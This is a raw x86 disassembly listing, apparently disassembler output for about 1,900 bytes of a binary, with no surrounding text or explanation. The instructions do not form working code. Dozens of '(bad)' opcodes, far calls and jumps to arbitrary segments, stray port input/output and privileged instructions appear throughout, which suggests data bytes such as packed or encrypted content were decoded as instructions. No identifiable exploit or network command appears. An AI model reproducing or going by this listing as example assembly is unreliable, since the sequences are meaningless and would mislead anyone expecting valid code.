  41c9c2:	and    DWORD PTR [edx-0x7ef799ea],edx
  41c9c8:	call   0x985e:0x6b5f4c07
  41c9cf:	(bad)  
  41c9d1:	ds sahf 
  41c9d3:	mov    ds,ebx
  41c9d5:	push   ds
  41c9d6:	push   0x3fd09f04
  41c9db:	push   ss
  41c9dc:	test   DWORD PTR [edi+0x1563ba74],edi
  41c9e2:	jg     0x41c967
  41c9e4:	bound  edx,QWORD PTR [eax+0x4f]
  41c9e7:	cmp    bl,bh
  41c9e9:	mov    ds:0x1b8a3d82,al
  41c9ee:	ds pop eax
  41c9f0:	ror    bl,1
  41c9f2:	loope  0x41c9bc
  41c9f4:	mov    edi,fs
  41c9f6:	aam    0xa8
  41c9f8:	loope  0x41ca6d
  41c9fa:	mov    dh,0x87
  41c9fc:	sbb    ch,BYTE PTR [edi+0x43]
  41c9ff:	outs   dx,BYTE PTR ds:[esi]
  41ca00:	push   0x8
  41ca02:	call   0x6b20:0xdf0a2a78
  41ca09:	and    edx,DWORD PTR [ebx+eiz*8]
  41ca0c:	cwde   
  41ca0d:	add    dl,dh
  41ca0f:	jp     0x41c9e0
  41ca11:	inc    ebp
  41ca12:	jle    0x41c9f9
  41ca14:	les    eax,FWORD PTR [edx+eiz*8]
  41ca17:	cdq    
  41ca18:	(bad)  
  41ca19:	mov    esi,0xae2b29fd
  41ca1e:	out    dx,eax
  41ca1f:	add    eax,DWORD PTR [ebx+0x6aa5a4ab]
  41ca25:	jmp    0x41c9fd
  41ca27:	and    al,0x22
  41ca29:	das    
  41ca2a:	repnz mov ch,0xfe
  41ca2d:	xchg   DWORD PTR [edx-0x1f694e01],ecx
  41ca33:	lahf   
  41ca34:	icebp  
  41ca35:	xor    DWORD PTR [ebp-0x27],ecx
  41ca38:	fidiv  DWORD PTR [ecx]
  41ca3a:	adc    eax,0xc005ea85
  41ca3f:	retf   0xeaa
  41ca42:	jb     0x41ca96
  41ca44:	sub    al,0xa3
  41ca46:	ja     0x41ca00
  41ca48:	shr    DWORD PTR [edx],0x6
  41ca4b:	dec    ecx
  41ca4c:	inc    edx
  41ca4d:	in     eax,0xf7
  41ca4f:	(bad)  
  41ca51:	ja     0x41c9f2
  41ca53:	leave  
  41ca54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca55:	(bad)  
  41ca56:	xchg   edx,eax
  41ca57:	mov    ds:0x4cfd13aa,al
  41ca5c:	mov    BYTE PTR [ebx],al
  41ca5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca5f:	mov    eax,ds:0x35d88ea1
  41ca64:	in     eax,dx
  41ca65:	fild   WORD PTR [edx]
  41ca67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca68:	aaa    
  41ca69:	adc    al,0x2f
  41ca6b:	adc    al,0x7c
  41ca6d:	not    BYTE PTR [edx-0x6d369723]
  41ca73:	sbb    dh,BYTE PTR [ebx+0x6c]
  41ca76:	sub    BYTE PTR [ebx+ecx*1],al
  41ca79:	int    0x5a
  41ca7b:	loop   0x41cac9
  41ca7d:	mov    eax,0x4bfcf36d
  41ca82:	ja     0x41ca24
  41ca84:	fimul  DWORD PTR [edi+esi*4+0x7fff479a]
  41ca8b:	shl    DWORD PTR [ebx+esi*8],1
  41ca8e:	lods   al,BYTE PTR ds:[esi]
  41ca8f:	fwait
  41ca90:	mov    cl,0x5a
  41ca92:	cmp    DWORD PTR [ecx+0x62],eax
  41ca95:	mov    BYTE PTR [ebp-0x268afbb5],cl
  41ca9b:	inc    ebp
  41ca9c:	(bad)  
  41ca9d:	push   ebp
  41ca9e:	daa    
  41ca9f:	and    ecx,DWORD PTR [edx-0xf]
  41caa2:	sar    BYTE PTR [edi+0x4b52c576],1
  41caa8:	sub    eax,0xb65752dc
  41caad:	mov    BYTE PTR [eax+0x4827c17f],bh
  41cab3:	ss sar dh,cl
  41cab6:	inc    edx
  41cab7:	mov    dl,al
  41cab9:	dec    eax
  41caba:	fist   WORD PTR [eax]
  41cabc:	(bad)
  41cac0:	imul   ebx,ebp,0x16
  41cac3:	inc    esp
  41cac4:	retf   
  41cac5:	add    BYTE PTR [edi+0x31eb91dc],al
  41cacb:	out    dx,al
  41cacc:	in     eax,dx
  41cacd:	push   ss
  41cace:	rcr    BYTE PTR [ebx+eiz*2-0x18f3037],1
  41cad5:	pop    ds
  41cad6:	cmp    al,0x75
  41cad8:	daa    
  41cad9:	retf   0xd7ef
  41cadc:	or     DWORD PTR [esi-0x787ef3e4],0x3b
  41cae3:	enter  0x4e1f,0x48
  41cae7:	das    
  41cae8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cae9:	jnp    0x41cacf
  41caeb:	jae    0x41cb65
  41caed:	jnp    0x41cabf
  41caef:	ds je  0x41cae7
  41caf2:	iret   
  41caf3:	sbb    al,0x62
  41caf5:	fstp   TBYTE PTR [edx+0x70]
  41caf8:	scas   al,BYTE PTR es:[edi]
  41caf9:	or     al,ah
  41cafb:	lods   eax,DWORD PTR ds:[esi]
  41cafc:	adc    BYTE PTR [edi],0x6c
  41caff:	add    edx,esp
  41cb01:	sub    cl,BYTE PTR [edi-0x6dd55be4]
  41cb07:	ins    BYTE PTR es:[edi],dx
  41cb08:	mov    bl,0xcc
  41cb0a:	mov    dl,0xac
  41cb0c:	gs mov esp,0xf0460806
  41cb12:	jge    0x41cb28
  41cb14:	cs div dl
  41cb17:	in     al,dx
  41cb18:	ret    0xf1d3
  41cb1b:	jne    0x41cb89
  41cb1d:	popf   
  41cb1e:	in     eax,0x33
  41cb20:	jmp    0xfcfe8152
  41cb25:	adc    ebp,DWORD PTR [ecx-0x795a03b6]
  41cb2b:	and    al,0xd5
  41cb2d:	mov    ebp,0x3251c221
  41cb32:	out    0x9e,al
  41cb34:	(bad)  
  41cb35:	in     eax,dx
  41cb36:	inc    ebx
  41cb37:	in     al,0x8a
  41cb39:	pop    edx
  41cb3a:	mov    ch,0xb2
  41cb3c:	sbb    ah,ch
  41cb3e:	pop    ebx
  41cb3f:	(bad)  
  41cb40:	repz dec esi
  41cb42:	jmp    FWORD PTR [edx]
  41cb44:	sar    DWORD PTR [ebx+edx*8-0x5e1291b9],cl
  41cb4b:	dec    ebx
  41cb4c:	xlat   BYTE PTR ds:[ebx]
  41cb4e:	sbb    bl,BYTE PTR [edx+0x27d2c7d3]
  41cb54:	push   esp
  41cb55:	test   BYTE PTR [edi+0xc5ed754],bl
  41cb5b:	add    edi,eax
  41cb5d:	rcl    DWORD PTR [edi+0x16],1
  41cb60:	ins    DWORD PTR es:[edi],dx
  41cb61:	add    ch,cl
  41cb63:	cdq    
  41cb64:	cmp    al,0x8f
  41cb66:	imul   esp,DWORD PTR [edx],0xffffffef
  41cb69:	jno    0x41cb57
  41cb6b:	popa   
  41cb6c:	mov    al,0x19
  41cb6f:	xor    eax,0x4f43e763
  41cb74:	xchg   ebp,eax
  41cb75:	push   ds
  41cb76:	bound  ebp,QWORD PTR [ebx]
  41cb78:	imul   edx,DWORD PTR [edi-0x5a],0x1f
  41cb7c:	(bad)
  41cb7f:	in     eax,0x2c
  41cb81:	mov    ecx,0xaf48b08f
  41cb86:	dec    esp
  41cb87:	push   ss
  41cb88:	and    eax,0x6c2c7adc
  41cb8d:	lods   al,BYTE PTR ds:[esi]
  41cb8e:	jp     0x41cb7c
  41cb90:	aad    0xcb
  41cb92:	adc    DWORD PTR [ebx],esp
  41cb94:	(bad)  
  41cb95:	or     BYTE PTR [ebp-0x74e24d45],al
  41cb9b:	add    ah,BYTE PTR [ebp+ebp*2+0xf25a18]
  41cba2:	push   esi
  41cba3:	mov    eax,ds:0xdfa9bfe4
  41cba8:	hlt    
  41cba9:	aaa    
  41cbaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cbab:	or     eax,0xef17a75
  41cbb0:	std    
  41cbb1:	sub    DWORD PTR [eax+ebx*1-0x690b6169],edx
  41cbb8:	pop    esp
  41cbb9:	std    
  41cbba:	popa   
  41cbbb:	std    
  41cbbc:	inc    esp
  41cbbd:	pop    es
  41cbbe:	lods   al,BYTE PTR ds:[esi]
  41cbbf:	fs call 0xe23f5a75
  41cbc5:	pop    ebp
  41cbc6:	les    ecx,FWORD PTR [esi+ebp*8]
  41cbc9:	sub    BYTE PTR ds:0x89d9a617,ah
  41cbd0:	fidivr DWORD PTR [esi+ebx*2-0x632affcc]
  41cbd7:	test   DWORD PTR ds:0xc2b81757,0xe0d7a38b
  41cbe1:	shl    BYTE PTR [edx+0x2c],cl
  41cbe4:	ins    BYTE PTR es:[edi],dx
  41cbe5:	mov    bl,0x6
  41cbe7:	shl    DWORD PTR ds:0x4dad3ce3,cl
  41cbed:	rcl    BYTE PTR [ecx+0x54],cl
  41cbf0:	test   eax,0x3b9bf2a8
  41cbf5:	outs   dx,BYTE PTR ds:[esi]
  41cbf6:	push   es
  41cbf7:	test   BYTE PTR [edx-0x6d],0xb3
  41cbfb:	push   ss
  41cbfc:	pop    ss
  41cbfd:	bound  edx,QWORD PTR [edx+0x1cfb6e30]
  41cc03:	adc    cl,BYTE PTR [edi+0x15cb67df]
  41cc09:	xchg   edi,eax
  41cc0a:	xchg   esi,eax
  41cc0b:	mov    BYTE PTR [ecx+0x7],cl
  41cc0e:	mov    ?,edx
  41cc10:	fist   WORD PTR [eax+edi*4-0x7abfdb12]
  41cc17:	(bad)  
  41cc18:	enter  0xb849,0x1a
  41cc1c:	dec    edi
  41cc1d:	imul   ebp,DWORD PTR [ecx],0x63
  41cc20:	aad    0xac
  41cc22:	push   cs
  41cc23:	out    0x75,eax
  41cc25:	dec    ecx
  41cc26:	jbe    0x41cbe5
  41cc28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc29:	pop    edx
  41cc2a:	out    dx,al
  41cc2b:	clc    
  41cc2c:	push   esi
  41cc2d:	inc    ebp
  41cc2e:	and    bh,BYTE PTR [ecx]
  41cc30:	fdivr  DWORD PTR [ecx-0x4e]
  41cc33:	repz sbb BYTE PTR [ecx],bl
  41cc36:	sahf   
  41cc37:	mov    dh,0xa9
  41cc39:	stos   DWORD PTR es:[edi],eax
  41cc3a:	mov    ah,0xdf
  41cc3c:	sbb    eax,0xfdedbf65
  41cc41:	add    DWORD PTR [ebp+0x1e],eax
  41cc44:	push   ebp
  41cc45:	cmp    al,0xd
  41cc47:	stos   BYTE PTR es:[edi],al
  41cc48:	or     al,0x44
  41cc4a:	pop    esi
  41cc4b:	xchg   ebp,eax
  41cc4c:	call   0x8bec2918
  41cc51:	push   0x24
  41cc53:	push   eax
  41cc54:	sbb    BYTE PTR [ebp-0x596ced4f],bh
  41cc5a:	(bad)  
  41cc5b:	ins    BYTE PTR es:[edi],dx
  41cc5c:	xor    eax,0x8d42f288
  41cc61:	mov    ch,0x62
  41cc63:	jns    0x41cc64
  41cc65:	jge    0x41cca9
  41cc67:	out    0xca,eax
  41cc69:	push   ebx
  41cc6a:	loope  0x41cc43
  41cc6c:	sti    
  41cc6d:	jg     0x41ccee
  41cc6f:	and    bh,BYTE PTR [edx+edi*8+0x4a]
  41cc73:	cmp    dh,BYTE PTR [eax]
  41cc75:	mov    ds:0xb807a412,al
  41cc7a:	push   eax
  41cc7b:	test   BYTE PTR [edx],cl
  41cc7d:	jmp    0xcfa7c73d
  41cc82:	cli    
  41cc83:	out    0xeb,al
  41cc85:	aam    0x1a
  41cc87:	daa    
  41cc88:	cmp    eax,0x519647b0
  41cc8d:	jo     0x41cc2f
  41cc8f:	xchg   ebp,eax
  41cc90:	pop    esi
  41cc91:	push   ecx
  41cc92:	jge    0x41cc25
  41cc94:	ret    
  41cc95:	jmp    0xab9d:0x8b54353b
  41cc9c:	mov    edx,DWORD PTR [eax]
  41cc9e:	aas    
  41cc9f:	aas    
  41cca0:	adc    al,0x98
  41cca2:	pop    edi
  41cca3:	mov    ebp,0xb5a9394b
  41cca8:	inc    edx
  41cca9:	mov    ebx,0x57e52084
  41ccae:	jmp    0xe9fdd32b
  41ccb3:	mov    edi,0xb63c88bc
  41ccb8:	push   esp
  41ccb9:	stos   DWORD PTR es:[edi],eax
  41ccba:	fcos   
  41ccbc:	push   0x97dab699
  41ccc1:	inc    ebx
  41ccc2:	add    edi,DWORD PTR [esi-0xc]
  41ccc5:	xlat   BYTE PTR ds:[ebx]
  41ccc6:	(bad)  
  41ccc7:	shl    DWORD PTR [edi-0x8],cl
  41ccca:	sub    BYTE PTR [ecx+0x28931b64],dl
  41ccd0:	fistp  QWORD PTR [ecx+0x2]
  41ccd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccd4:	ret    0xb6c9
  41ccd7:	sbb    dh,dh
  41ccd9:	mov    ch,0x78
  41ccdb:	jno    0x41ccfa
  41ccdd:	push   es
  41ccde:	ins    DWORD PTR es:[edi],dx
  41ccdf:	sub    ch,BYTE PTR [eax-0x31f08ad9]
  41cce5:	dec    ebx
  41cce6:	nop
  41cce7:	dec    ebp
  41cce8:	div    DWORD PTR [ebx+0x53a7c028]
  41ccee:	mov    esi,0x9fd49a1f
  41ccf3:	sar    DWORD PTR [esi+0x46],1
  41ccf6:	js     0x41ccb6
  41ccf8:	ret    0x9abe
  41ccfb:	xor    ah,ah
  41ccfd:	mov    ebp,0xed323d57
  41cd02:	adc    ecx,DWORD PTR [ebx]
  41cd04:	and    ecx,DWORD PTR [ebp+0xa37806]
  41cd0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd0b:	je     0x41cd0a
  41cd0d:	xchg   esi,eax
  41cd0e:	call   0x6136fb5a
  41cd13:	hlt    
  41cd14:	cwde   
  41cd15:	outs   dx,BYTE PTR ds:[esi]
  41cd16:	jle    0x41cd03
  41cd18:	(bad)  
  41cd19:	and    ecx,DWORD PTR [esp+eiz*8]
  41cd1c:	xchg   edx,eax
  41cd1d:	sub    esi,eax
  41cd1f:	sub    cl,BYTE PTR [ebx+0x12]
  41cd22:	pop    esp
  41cd23:	jmp    0x5e6d:0xc9c51379
  41cd2a:	xchg   esi,eax
  41cd2b:	xor    ah,cl
  41cd2d:	pusha  
  41cd2e:	scas   al,BYTE PTR es:[edi]
  41cd2f:	stos   DWORD PTR es:[edi],eax
  41cd30:	mov    eax,ds:0x7ec41f3f
  41cd35:	jae    0x41cd84
  41cd37:	sbb    DWORD PTR ds:0xc171e12d,0x24
  41cd3e:	ror    BYTE PTR [edi],cl
  41cd40:	(bad)  
  41cd41:	mov    ch,0x7
  41cd43:	in     eax,dx
  41cd44:	div    dh
  41cd46:	pop    eax
  41cd47:	daa    
  41cd48:	loop   0x41cd2a
  41cd4a:	addr16 add al,0x4f
  41cd4d:	inc    esp
  41cd4e:	pusha  
  41cd4f:	or     eax,0x41010d9e
  41cd54:	call   FWORD PTR [edi+0x76]
  41cd57:	out    0x27,eax
  41cd59:	ds push edx
  41cd5b:	in     eax,0x1f
  41cd5d:	push   edx
  41cd5e:	pop    ds
  41cd5f:	test   edx,eax
  41cd61:	cli    
  41cd62:	adc    eax,0x8563ec98
  41cd67:	xlat   BYTE PTR ds:[ebx]
  41cd68:	cld    
  41cd69:	and    DWORD PTR ds:0x9fce877b,0x25c6dee4
  41cd73:	test   BYTE PTR [esi+0x5e868b08],0x32
  41cd7a:	mov    al,0xb1
  41cd7c:	inc    edx
  41cd7d:	xchg   ecx,eax
  41cd7e:	shr    esp,cl
  41cd80:	(bad)  
  41cd81:	and    BYTE PTR [ebx-0x41a6bb41],cl
  41cd87:	adc    al,0x1b
  41cd89:	sub    eax,0xdef0b15e
  41cd8e:	jecxz  0x41cd2b
  41cd90:	ins    DWORD PTR es:[edi],dx
  41cd91:	push   ss
  41cd92:	sbb    BYTE PTR [edi-0x59],0x54
  41cd96:	mov    esi,esi
  41cd98:	xlat   BYTE PTR ds:[ebx]
  41cd99:	xchg   BYTE PTR [edi-0x65],al
  41cd9c:	cmp    DWORD PTR [ebx-0x53689e6b],ecx
  41cda2:	arpl   dx,sp
  41cda4:	imul   esp,DWORD PTR [edi+ecx*2+0x4f],0xfc4fe5e
  41cdac:	test   ebp,eax
  41cdae:	cs jae 0x41ce1b
  41cdb1:	sub    dl,BYTE PTR [edx+0x51]
  41cdb4:	mov    cl,0x28
  41cdb6:	xor    al,0x2b
  41cdb8:	loop   0x41ce34
  41cdba:	jmp    0xc4cc:0x9ef5d4b
  41cdc1:	fmul   QWORD PTR [edx+0x6450e10d]
  41cdc7:	xchg   ebp,eax
  41cdc8:	outs   dx,DWORD PTR ds:[esi]
  41cdc9:	pop    ecx
  41cdca:	cmp    al,0x3e
  41cdcc:	add    bh,bh
  41cdce:	fistp  DWORD PTR [ecx+edx*2+0xa97c3a6]
  41cdd5:	loope  0x41ce0a
  41cdd7:	sub    al,0x1
  41cdd9:	les    edx,FWORD PTR [ebx+0x269b4408]
  41cddf:	xlat   BYTE PTR ds:[ebx]
  41cde0:	mov    dl,0x8b
  41cde2:	xlat   BYTE PTR ds:[ebx]
  41cde3:	push   0xffffff84
  41cde5:	sbb    ebx,esp
  41cde7:	xor    DWORD PTR [edx-0x75],esi
  41cdea:	mov    dl,0x42
  41cdec:	cld    
  41cded:	jno    0x41ce63
  41cdef:	ss leave 
  41cdf1:	push   0x72
  41cdf3:	push   cs
  41cdf4:	(bad)  
  41cdf5:	leave  
  41cdf6:	pop    ss
  41cdf7:	sub    eax,0x78bd97a4
  41cdfc:	pushf  
  41cdfd:	(bad)  
  41cdfe:	int    0x63
  41ce00:	test   eax,0x59168634
  41ce05:	xor    DWORD PTR [edx+0x148fd1b5],eax
  41ce0b:	test   DWORD PTR [ebp-0x5ccf7cd],ebp
  41ce11:	xchg   ebp,eax
  41ce12:	adc    al,0xb4
  41ce14:	call   0xd3287e92
  41ce19:	mov    DWORD PTR [esi-0x737fc34],0x23baebd8
  41ce23:	sub    cl,BYTE PTR [edx-0x22]
  41ce26:	adc    esp,DWORD PTR [edi+0x692f51b3]
  41ce2c:	add    BYTE PTR [ebx],0xcc
  41ce2f:	pusha  
  41ce30:	mov    edx,0x54021d6a
  41ce35:	and    al,BYTE PTR [ebx-0x44]
  41ce38:	mov    dl,0xcf
  41ce3a:	xlat   BYTE PTR ds:[ebx]
  41ce3b:	xor    BYTE PTR ss:[eax-0x5cb22b79],dl
  41ce42:	das    
  41ce43:	call   DWORD PTR [edi+0x60b6a57c]
  41ce49:	stc    
  41ce4a:	fisttp DWORD PTR [edi]
  41ce4c:	jb     0x41cec0
  41ce4e:	aad    0x21
  41ce50:	cs retf 0x44f1
  41ce54:	push   ss
  41ce55:	xor    eax,0xd48dcc50
  41ce5a:	sbb    DWORD PTR [edi+0x40353db5],0x5bdc4e7
  41ce64:	or     dl,al
  41ce66:	mov    bl,0xf3
  41ce68:	in     al,0xaf
  41ce6a:	pop    edx
  41ce6b:	mov    eax,0x33beedd9
  41ce70:	xchg   edx,eax
  41ce71:	mov    ebp,0xee0bab20
  41ce76:	jmp    0x4aa21f98
  41ce7b:	pop    esp
  41ce7c:	xlat   BYTE PTR ds:[ebx]
  41ce7d:	retf   
  41ce7e:	imul   BYTE PTR [ebx+esi*8]
  41ce81:	push   ebp
  41ce82:	out    0x92,eax
  41ce84:	sbb    DWORD PTR [esi],esp
  41ce86:	push   ecx
  41ce87:	jmp    0xe655e3c1
  41ce8c:	sbb    al,BYTE PTR [ebp-0x69e49afb]
  41ce92:	ja     0x41ce62
  41ce94:	xchg   esi,eax
  41ce95:	sub    dl,BYTE PTR [esi+0x7dbd6df6]
  41ce9b:	mov    ds:0x7b1b8ad9,al
  41cea0:	retf   0x9918
  41cea3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cea4:	mov    edx,0x7d96e1a4
  41cea9:	inc    ecx
  41ceaa:	and    BYTE PTR [edi],0x2c
  41cead:	out    0xdb,eax
  41ceaf:	add    eax,0x2d75a9ca
  41ceb4:	or     ebp,DWORD PTR [ebx-0xb]
  41ceb7:	cmc    
  41ceb8:	pop    ds
  41ceb9:	mov    ds:0xaadbefaf,al
  41cebe:	and    al,0x58
  41cec0:	xor    ecx,DWORD PTR [eax]
  41cec2:	cmp    ah,BYTE PTR [eax+0x48]
  41cec5:	mov    dl,0x66
  41cec7:	fld    TBYTE PTR cs:[edi+ebx*4+0x617e69c2]
  41cecf:	popa   
  41ced0:	repnz popf 
  41ced2:	fwait
  41ced3:	push   es
  41ced4:	pusha  
  41ced5:	add    BYTE PTR [esi*2-0xbf16c96],dh
  41cedc:	enter  0x765b,0xf4
  41cee0:	mov    bl,0x81
  41cee2:	cld    
  41cee3:	cwde   
  41cee4:	retf   
  41cee5:	into   
  41cee6:	and    eax,0xc7e87311
  41ceeb:	ins    DWORD PTR es:[edi],dx
  41ceec:	ds in  al,0x4
  41ceef:	int3   
  41cef0:	clc    
  41cef1:	pop    edx
  41cef2:	sbb    eax,0x354f5379
  41cef7:	retf   
  41cef8:	arpl   WORD PTR [eax],ax
  41cefa:	or     DWORD PTR [ecx+0x326cd21b],edx
  41cf00:	pop    edi
  41cf01:	cmp    cl,BYTE PTR [ecx+0x249393aa]
  41cf07:	adc    al,0x97
  41cf09:	loope  0x41cedd
  41cf0b:	xchg   ebp,eax
  41cf0c:	sub    al,BYTE PTR [ecx]
  41cf0e:	call   0x28c3de15
  41cf13:	mov    edi,0x73c725b0
  41cf18:	dec    eax
  41cf19:	fs jae 0x41cf8c
  41cf1c:	shl    eax,cl
  41cf1e:	repnz and eax,0x16331a97
  41cf24:	jne    0x41cf21
  41cf26:	fbstp  TBYTE PTR [edx+0x1f]
  41cf29:	adc    eax,ecx
  41cf2b:	sbb    BYTE PTR fs:[eax+0x341bc669],ah
  41cf32:	mov    ebx,0x1d391bf1
  41cf37:	inc    edi
  41cf38:	xchg   esi,eax
  41cf39:	call   0xb2213b90
  41cf3e:	call   0x3013:0x84acafa
  41cf45:	inc    ebp
  41cf46:	js     0x41cfb8
  41cf48:	or     al,0x75
  41cf4a:	dec    ebp
  41cf4b:	or     DWORD PTR [ecx+0x75e1883a],ebx
  41cf51:	xchg   ecx,eax
  41cf52:	mov    bh,0x7f
  41cf54:	add    DWORD PTR [eax-0x5],ebp
  41cf57:	jae    0x41cf06
  41cf59:	loope  0x41cee7
  41cf5b:	sub    eax,0xd8f44db8
  41cf60:	iret   
  41cf61:	pushf  
  41cf62:	invd   
  41cf64:	in     al,dx
  41cf65:	jbe    0x41cfb5
  41cf67:	(bad)  
  41cf68:	adc    DWORD PTR [ebx-0x4b],0xfffffff2
  41cf6c:	or     bl,BYTE PTR [esi-0x4a9e5be6]
  41cf72:	push   esi
  41cf73:	and    DWORD PTR [ecx],edi
  41cf75:	and    ah,BYTE PTR [ecx+0x5ae252a4]
  41cf7b:	sub    ecx,DWORD PTR [esi]
  41cf7d:	jno    0x41cf15
  41cf7f:	outs   dx,BYTE PTR ds:[esi]
  41cf80:	sbb    ebx,esi
  41cf82:	shl    ebx,1
  41cf84:	jns    0x41cf23
  41cf86:	psrld  mm7,QWORD PTR [esp+0x1f]
  41cf8b:	mov    ebx,DWORD PTR [edi+edi*8]
  41cf8e:	fld    TBYTE PTR [edx-0x62]
  41cf91:	add    ch,dl
  41cf93:	enter  0x76fe,0xc9
  41cf97:	adc    al,0xff
  41cf99:	js     0x41cf78
  41cf9b:	xor    BYTE PTR [esi+eax*8+0x3136e31e],0xef
  41cfa3:	mov    al,0x82
  41cfa5:	aad    0xa9
  41cfa7:	or     eax,DWORD PTR [ecx+esi*8-0x6a]
  41cfab:	and    edi,ecx
  41cfad:	mov    cl,0xf3
  41cfaf:	ret    
  41cfb0:	outs   dx,DWORD PTR ds:[esi]
  41cfb1:	push   esp
  41cfb2:	or     DWORD PTR [esi-0x8],ebx
  41cfb5:	dec    edi
  41cfb6:	je     0x41cfa1
  41cfb8:	dec    ebp
  41cfb9:	mov    esp,0xfa38a316
  41cfbe:	cmp    eax,0x13f3507
  41cfc3:	push   ebx
  41cfc4:	jp     0x41cff2
  41cfc6:	jp     0x41cfa0
  41cfc8:	add    DWORD PTR [edi+0x6ecee623],ebx
  41cfce:	in     al,dx
  41cfcf:	repnz movs BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41cfd2:	(bad)  
  41cfd3:	(bad)  
  41cfd4:	fcomp  st(1)
  41cfd6:	out    0x92,al
  41cfd8:	es jmp 0x41d052
  41cfdb:	iret   
  41cfdc:	out    dx,al
  41cfdd:	push   es
  41cfde:	xchg   esi,eax
  41cfdf:	fld    DWORD PTR [edx]
  41cfe1:	dec    esi
  41cfe2:	call   0x101b4e02
  41cfe7:	pop    esi
  41cfe8:	or     dh,dl
  41cfea:	shl    DWORD PTR [edx-0x18aab42],0x28
  41cff1:	leave  
  41cff2:	std    
  41cff3:	adc    DWORD PTR [ebp+0x1c],edi
  41cff6:	aas    
  41cff7:	nop
  41cff8:	add    ah,ch
  41cffa:	sub    BYTE PTR [eax],bl
  41cffc:	pop    ebx
  41cffd:	cwde   
  41cffe:	mov    ds,WORD PTR [eax-0x54]
  41d001:	mov    eax,ds:0x9dd8a158
  41d006:	sbb    BYTE PTR [eax],dl
  41d008:	fbstp  TBYTE PTR [esi-0x40]
  41d00b:	add    BYTE PTR [ebx-0x26],dh
  41d00e:	cmp    al,0xcb
  41d010:	fidivr WORD PTR [ebx+edx*2-0x78]
  41d014:	inc    edx
  41d015:	ja     0x41d01a
  41d017:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d018:	out    dx,al
  41d019:	mov    edx,0xba455d01
  41d01e:	adc    al,0xf8
  41d020:	cdq    
  41d021:	icebp  
  41d022:	test   DWORD PTR [ebx+0x46],eax
  41d025:	jg     0x41d024
  41d027:	fcomi  st,st(5)
  41d029:	and    DWORD PTR [ecx-0xf3f8eed],eax
  41d02f:	mov    bl,0xa0
  41d031:	out    dx,al
  41d032:	add    esi,DWORD PTR [ecx-0x1a28295a]
  41d038:	repnz and eax,0x4037bed8
  41d03e:	push   edi
  41d03f:	arpl   WORD PTR [ecx-0x68d668c8],bx
  41d045:	scas   al,BYTE PTR es:[edi]
  41d046:	jle    0x41cfeb
  41d048:	ins    BYTE PTR es:[edi],dx
  41d049:	stos   BYTE PTR es:[edi],al
  41d04a:	pop    ebx
  41d04b:	xor    DWORD PTR [edx],0x49fcb5b3
  41d051:	xor    esi,0xfc596f9b
  41d057:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d058:	(bad)  
  41d059:	in     eax,0xb4
  41d05b:	mov    ?,WORD PTR [esi-0x35c913d7]
  41d061:	cli    
  41d062:	dec    eax
  41d063:	dec    eax
  41d064:	push   edi
  41d065:	lods   eax,DWORD PTR ds:[esi]
  41d066:	sub    al,0x32
  41d068:	mov    bl,0xb6
  41d06a:	add    eax,0xf2f7756c
  41d06f:	data16 mov BYTE PTR [edi-0x6bd5fbb2],dh
  41d076:	mov    cl,0xe
  41d078:	test   DWORD PTR [edx],0x6d37391d
  41d07e:	dec    edx
  41d07f:	ins    DWORD PTR es:[edi],dx
  41d080:	mov    al,ds:0x6080bf50
  41d085:	xchg   esp,eax
  41d086:	or     DWORD PTR ds:0x77dd9deb,esp
  41d08c:	into   
  41d08d:	data16 test al,0x90
  41d090:	int    0xf0
  41d092:	push   ebp
  41d093:	jo     0x41d079
  41d095:	xor    esp,DWORD PTR [edi]
  41d097:	dec    esp
  41d099:	lahf   
  41d09a:	add    BYTE PTR [eax+edi*4+0x14e2974b],bl
  41d0a1:	bound  ebp,QWORD PTR [bp+di]
  41d0a4:	push   ebp
  41d0a5:	mov    ch,0x29
  41d0a7:	cmp    al,BYTE PTR [esi]
  41d0a9:	lds    edi,FWORD PTR [esp+ebx*4]
  41d0ac:	icebp  
  41d0ad:	push   ds
  41d0ae:	ja     0x41d079
  41d0b0:	pop    eax
  41d0b1:	mov    bl,al
  41d0b3:	inc    eax
  41d0b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0b5:	xchg   edx,eax
  41d0b6:	or     DWORD PTR [edx-0x7635358d],ebx
  41d0bc:	add    DWORD PTR [esi+0x529dbba9],ebx
  41d0c2:	dec    eax
  41d0c3:	mov    ds:0x5c594c71,eax
  41d0c8:	mov    bl,0xfc
  41d0ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0cb:	out    0x27,al
  41d0cd:	retf   
  41d0ce:	mov    ecx,0x22ec4a66
  41d0d3:	imul   esi,DWORD PTR [edi],0xffffff93
  41d0d6:	call   0xf329aea0
  41d0db:	add    eax,0x6ad08ce7
  41d0e0:	jmp    0xc1da:0xffdf8a96
  41d0e7:	test   BYTE PTR [ebx+0x5f],dl
  41d0ea:	or     DWORD PTR [edx-0x6],ebx
  41d0ed:	out    0xea,eax
  41d0ef:	mov    esi,fs
  41d0f1:	pop    edx
  41d0f2:	neg    BYTE PTR [esi]
  41d0f4:	fist   DWORD PTR ds:0xeb632024
  41d0fa:	sub    ebx,DWORD PTR [eax-0x44ea22f5]
  41d100:	(bad)  
  41d101:	cmp    DWORD PTR [ecx+edi*2],esi
  41d104:	arpl   di,sp
  41d106:	mov    dl,0x9d
  41d108:	loope  0x41d108
  41d10a:	push   ds
  41d10b:	cmp    al,0xeb
  41d10d:	call   0x9fa8a34f
  41d112:	rcl    edx,cl
  41d114:	sbb    BYTE PTR [ebx],ah
  41d116:	ss dec eax
  41d118:	dec    ebp
  41d119:	(bad)  
  41d11a:	ror    esp,0x5d
  41d11d:	xlat   BYTE PTR ds:[ebx]
  41d11e:	loop   0x41d108
  41d120:	scas   al,BYTE PTR es:[edi]
  41d121:	mov    ss,WORD PTR [esi+0x4301be77]
  41d127:	jns    0x41d179
  41d129:	ss jmp 0x41d13a
  41d12c:	push   edx
